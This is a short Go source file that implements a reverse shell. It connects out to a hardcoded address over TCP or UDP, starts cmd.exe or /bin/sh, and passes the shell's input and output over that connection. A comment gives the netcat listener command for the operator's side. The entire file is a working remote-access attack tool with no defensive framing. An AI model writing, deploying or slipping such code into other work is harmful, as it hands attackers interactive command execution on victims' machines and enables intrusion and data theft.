package main

/*
nc -lvp 端口
*/


import(
	"fmt"
	"runtime"
	"os/exec"
	"net"
	"time"
)


var(
	shell  		string
	port   		string
	ip     		string
	addr   		string
	protocol	string
	conn  net.Conn 
)


func init() {
	ip         =   "172.20.10.10"
	port 	   =   "11112"
	protocol   =   "tcp"
	if runtime.GOOS == "windows" { 
		shell = "c:\\windows\\system32\\cmd.exe"
	} else {
		shell = "/bin/sh"
	}
	addr = fmt.Sprintf("%s:%s", ip, port)
}



func main() {
	if protocol == "tcp" {
		conn = tcp(addr)
	} else {
		conn = udp(addr)
		conn.Write([]byte("\n"))
	}
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
	conn.Close()
}


// TCP 链接
func tcp(addr string) net.Conn {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	checkError(err)
	return conn
}

func udp(addr string) *net.UDPConn {
	udpAddr, err := net.ResolveUDPAddr("udp4", addr)
	checkError(err)
	conn, err := net.DialUDP("udp", nil, udpAddr)
	return conn
}


// 检查错误
func checkError(err error) {
	if err != nil {
		fmt.Println(err.Error())
	}
}


